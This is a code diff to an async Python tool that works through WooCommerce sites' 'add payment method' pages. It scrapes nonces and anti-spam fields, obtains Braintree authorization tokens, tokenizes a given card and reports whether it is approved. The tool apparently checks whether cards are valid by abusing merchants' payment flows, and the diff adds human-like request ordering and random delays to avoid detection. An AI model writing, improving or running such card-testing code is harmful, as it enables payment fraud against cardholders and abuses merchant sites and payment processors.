@@ -1018,7 +1018,19 @@ async def get_payment_method_nonce(session: aiohttp.ClientSession, url: str) -> 
     Raises:
         TokenError: If nonce cannot be retrieved
     """
+    # First visit payment-methods page to establish proper session
     headers = get_headers(url, f'https://{url}/my-account/')
+    payment_methods_url = f'https://{url}/my-account/payment-methods/'
+    
+    logger.debug("Fetching payment-methods page first")
+    try:
+        await fetch_page_with_retry(session, payment_methods_url, headers)
+        await asyncio.sleep(random.uniform(0.5, 1.0))
+    except Exception as e:
+        logger.debug(f"Payment-methods page access non-critical: {str(e)}")
+    
+    # Now fetch add-payment-method page
+    headers = get_headers(url, payment_methods_url)
     page_url = f'https://{url}/my-account/add-payment-method/'
     
     logger.debug("Fetching add payment method page")
@@ -1048,7 +1060,8 @@ async def get_payment_method_nonce(session: aiohttp.ClientSession, url: str) -> 
     return wnonce, apbct_fields
 
 async def get_braintree_authorization_token(session: aiohttp.ClientSession, url: str, 
-                                            apbct_fields: APBCTFields) -> str:
+                                            apbct_fields: APBCTFields, 
+                                            add_payment_text: str) -> str:
     """
     Get Braintree authorization token with improved methods.
     
@@ -1056,6 +1069,7 @@ async def get_braintree_authorization_token(session: aiohttp.ClientSession, url:
         session: aiohttp client session
         url: Site URL
         apbct_fields: Anti-spam fields
+        add_payment_text: HTML text from add-payment-method page
         
     Returns:
         Authorization fingerprint
@@ -1063,77 +1077,18 @@ async def get_braintree_authorization_token(session: aiohttp.ClientSession, url:
     Raises:
         TokenError: If token cannot be retrieved
     """
-    headers = get_headers(url)
-    
-    # Try payment-methods page first (some sites have token there)
-    payment_methods_url = f'https://{url}/my-account/payment-methods/'
-    try:
-        text = await fetch_page_with_retry(session, payment_methods_url, headers)
-        
-        # Check for embedded token on payment-methods page
-        braintree_token = extract_with_regex('braintree_client_token', text)
-        if not braintree_token:
-            braintree_token = extract_with_regex('braintree_client_token_alt', text)
-        
-        if braintree_token:
-            logger.debug("Found embedded token on payment-methods page")
-            try:
-                decoded = base64.b64decode(braintree_token).decode("utf-8")
-                auth_fingerprint = extract_with_regex('auth_fingerprint', decoded)
-                if auth_fingerprint:
-                    logger.info("Authorization fingerprint extracted from embedded token (payment-methods)")
-                    return auth_fingerprint
-            except Exception as e:
-                logger.debug(f"Failed to decode embedded token from payment-methods: {str(e)}")
-        
-        # Get client token nonce from payment-methods page
-        cnonce = extract_with_regex('client_token_nonce', text)
-        if not cnonce:
-            cnonce = extract_with_regex('client_token_nonce_alt', text)
-        
-        if cnonce:
-            logger.debug("Getting Braintree client token via AJAX (from payment-methods page)")
-            post_data_str = f"action=wc_braintree_credit_card_get_client_token&nonce={cnonce}"
-            
-            ajax_headers = get_headers(url, payment_methods_url, is_post=True)
-            ajax_headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
-            ajax_headers['x-requested-with'] = 'XMLHttpRequest'
-            ajax_headers['accept'] = '*/*'
-            
-            ajax_url = f'https://{url}/wp-admin/admin-ajax.php'
-            
-            try:
-                ajax_text = await post_data_with_retry(session, ajax_url, post_data_str, ajax_headers)
-                
-                data_token = extract_with_regex('data_token', ajax_text)
-                if data_token:
-                    decoded = base64.b64decode(data_token).decode("utf-8")
-                    auth_fingerprint = extract_with_regex('auth_fingerprint', decoded)
-                    if auth_fingerprint:
-                        logger.info("Authorization fingerprint extracted from AJAX token")
-                        return auth_fingerprint
-            except Exception as e:
-                logger.debug(f"AJAX method failed: {str(e)}")
-    
-    except Exception as e:
-        logger.debug(f"Payment-methods page check failed: {str(e)}")
-    
-    # Try add-payment-method page
-    page_url = f'https://{url}/my-account/add-payment-method/'
-    text = await fetch_page_with_retry(session, page_url, headers)
-    
-    # Update APBCT fields
+    # Update APBCT fields from the page we already fetched
     if not apbct_fields.apbct_visible or not apbct_fields.ct_no_cookie:
-        new_fields = extract_apbct_fields(text)
+        new_fields = extract_apbct_fields(add_payment_text)
         if new_fields.apbct_visible:
             apbct_fields.apbct_visible = new_fields.apbct_visible
         if new_fields.ct_no_cookie:
             apbct_fields.ct_no_cookie = new_fields.ct_no_cookie
     
-    # Try embedded token on add-payment-method page
-    braintree_token = extract_with_regex('braintree_client_token', text)
+    # Try embedded token on add-payment-method page first
+    braintree_token = extract_with_regex('braintree_client_token', add_payment_text)
     if not braintree_token:
-        braintree_token = extract_with_regex('braintree_client_token_alt', text)
+        braintree_token = extract_with_regex('braintree_client_token_alt', add_payment_text)
     
     if braintree_token:
         logger.debug("Using embedded Braintree token from add-payment-method page")
@@ -1144,17 +1099,18 @@ async def get_braintree_authorization_token(session: aiohttp.ClientSession, url:
                 logger.info("Authorization fingerprint extracted from embedded token")
                 return auth_fingerprint
         except Exception as e:
-            logger.warning(f"Failed to decode embedded token: {str(e)}")
+            logger.debug(f"Failed to decode embedded token: {str(e)}")
     
     # Try AJAX method with add-payment-method page
-    cnonce = extract_with_regex('client_token_nonce', text)
+    cnonce = extract_with_regex('client_token_nonce', add_payment_text)
     if not cnonce:
-        cnonce = extract_with_regex('client_token_nonce_alt', text)
+        cnonce = extract_with_regex('client_token_nonce_alt', add_payment_text)
     
     if cnonce:
-        logger.debug("Getting Braintree client token via AJAX (from add-payment-method page)")
+        logger.debug("Getting Braintree client token via AJAX")
         post_data_str = f"action=wc_braintree_credit_card_get_client_token&nonce={cnonce}"
         
+        page_url = f'https://{url}/my-account/add-payment-method/'
         ajax_headers = get_headers(url, page_url, is_post=True)
         ajax_headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
         ajax_headers['x-requested-with'] = 'XMLHttpRequest'
@@ -1332,6 +1288,42 @@ async def submit_payment_method(session: aiohttp.ClientSession, url: str,
     logger.info(f"Payment result: {result}")
     return result
 
+async def get_add_payment_method_page(session: aiohttp.ClientSession, url: str) -> str:
+    """
+    Fetch add payment method page following proper request flow.
+    
+    Args:
+        session: aiohttp client session
+        url: Site URL
+        
+    Returns:
+        Page HTML text
+    """
+    # Visit payment-methods page first
+    headers = get_headers(url, f'https://{url}/my-account/')
+    payment_methods_url = f'https://{url}/my-account/payment-methods/'
+    
+    logger.debug("Visiting payment-methods page")
+    try:
+        await fetch_page_with_retry(session, payment_methods_url, headers)
+        await asyncio.sleep(random.uniform(0.5, 1.0))
+    except Exception as e:
+        logger.debug(f"Payment-methods page access: {str(e)}")
+    
+    # Now fetch add-payment-method page
+    headers = get_headers(url, payment_methods_url)
+    page_url = f'https://{url}/my-account/add-payment-method/'
+    
+    logger.debug("Fetching add-payment-method page")
+    text = await fetch_page_with_retry(session, page_url, headers)
+    
+    # Check if logged in
+    if 'login' in text.lower() and 'logout' not in text.lower():
+        logger.error("Session expired - not logged in")
+        raise AuthenticationError("Session expired - not logged in")
+    
+    return text
+
 async def process_card(session: aiohttp.ClientSession, url: str, 
                       card: CardDetails, apbct_fields: APBCTFields) -> PaymentResult:
     """
@@ -1352,23 +1344,44 @@ async def process_card(session: aiohttp.ClientSession, url: str,
     try:
         logger.info(f"Processing card: {card.masked_number()}")
         
-        # Update billing address (non-critical)
+        # Step 1: Update billing address (non-critical)
         await update_billing_address(session, url, apbct_fields)
+        await asyncio.sleep(random.uniform(0.5, 1.0))
         
-        # Get payment method nonce
-        wnonce, updated_apbct_fields = await get_payment_method_nonce(session, url)
+        # Step 2: Get add-payment-method page (follows proper request flow)
+        add_payment_text = await get_add_payment_method_page(session, url)
+        
+        # Check if site uses NMI Gateway instead of Braintree
+        if 'nmi_gateway' in add_payment_text.lower() or 'nmi-gateway' in add_payment_text.lower():
+            logger.warning("Site uses NMI Gateway, not Braintree - skipping")
+            raise TokenError("Site uses NMI Gateway payment method, not Braintree")
+        
+        # Step 3: Extract payment method nonce from the page
+        wnonce = extract_with_regex('payment_method_nonce', add_payment_text)
+        if not wnonce:
+            logger.error("Payment method nonce not found")
+            if 'braintree' not in add_payment_text.lower():
+                logger.warning("Braintree not found on add-payment-method page")
+            raise TokenError("Failed to get payment method nonce")
+        
+        # Update APBCT fields
+        updated_apbct_fields = extract_apbct_fields(add_payment_text)
         if updated_apbct_fields.apbct_visible:
             apbct_fields.apbct_visible = updated_apbct_fields.apbct_visible
         if updated_apbct_fields.ct_no_cookie:
             apbct_fields.ct_no_cookie = updated_apbct_fields.ct_no_cookie
         
-        # Get Braintree authorization token
-        auth_fingerprint = await get_braintree_authorization_token(session, url, apbct_fields)
+        logger.debug("Payment method nonce retrieved")
         
-        # Tokenize card
+        # Step 4: Get Braintree authorization token (uses the same page text)
+        auth_fingerprint = await get_braintree_authorization_token(session, url, apbct_fields, add_payment_text)
+        await asyncio.sleep(random.uniform(0.3, 0.7))
+        
+        # Step 5: Tokenize card with Braintree API
         token, brand_code = await tokenize_card_with_braintree(session, card, auth_fingerprint)
+        await asyncio.sleep(random.uniform(0.3, 0.7))
         
-        # Submit payment method
+        # Step 6: Submit payment method
         result = await submit_payment_method(session, url, token, brand_code, wnonce, apbct_fields)
         result.card_brand = brand_code
         
@@ -1500,17 +1513,28 @@ async def test_single_site(site_url: str, card: CardDetails):
             # STEP 4: Add payment method
             print("[STEP 4] Payment Method...")
             try:
-                wnonce, updated_apbct = await get_payment_method_nonce(session, site_url)
+                # Get add-payment-method page
+                add_payment_text = await get_add_payment_method_page(session, site_url)
                 
+                # Extract payment method nonce
+                wnonce = extract_with_regex('payment_method_nonce', add_payment_text)
                 if not wnonce:
                     print("  [FAIL] No payment nonce")
                     results['step4_payment_method'] = 'FAIL'
                     results['error'] = 'No payment nonce'
                     return results
                 
-                auth_fingerprint = await get_braintree_authorization_token(session, site_url, updated_apbct)
+                # Update APBCT fields
+                updated_apbct = extract_apbct_fields(add_payment_text)
+                if updated_apbct.apbct_visible:
+                    apbct_fields.apbct_visible = updated_apbct.apbct_visible
+                if updated_apbct.ct_no_cookie:
+                    apbct_fields.ct_no_cookie = updated_apbct.ct_no_cookie
+                
+                # Get auth token and tokenize
+                auth_fingerprint = await get_braintree_authorization_token(session, site_url, apbct_fields, add_payment_text)
                 token, brand_code = await tokenize_card_with_braintree(session, card, auth_fingerprint)
-                result = await submit_payment_method(session, site_url, token, brand_code, wnonce, updated_apbct)
+                result = await submit_payment_method(session, site_url, token, brand_code, wnonce, apbct_fields)
                 
                 if result.status == PaymentStatus.APPROVED:
                     print(f"  [PASS] {result.message}")
